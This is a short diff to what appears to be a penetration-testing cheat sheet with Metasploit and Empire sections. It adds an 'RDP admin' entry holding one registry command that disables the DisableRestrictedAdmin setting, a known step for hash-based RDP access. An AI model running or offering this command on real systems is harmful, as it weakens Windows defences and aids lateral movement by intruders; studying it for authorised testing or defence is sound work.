@@ -93,6 +93,7 @@
   - [list](#list)
   - [Metasploit](#metasploit)
   - [Empire](#empire)
+  - [RDP admin](#rdp-admin)
 
 # SWEEP
 ```bash
@@ -1013,4 +1014,9 @@ usestager windows_cmd_exec
 
 agents
 interact
+```
+
+## RDP admin
+```bash
+reg add HKLM\System\CurrentControlSet\Control\Lsa /t REG_DWORD /v DisableRestrictedAdmin /d 0x0 /f
 ```
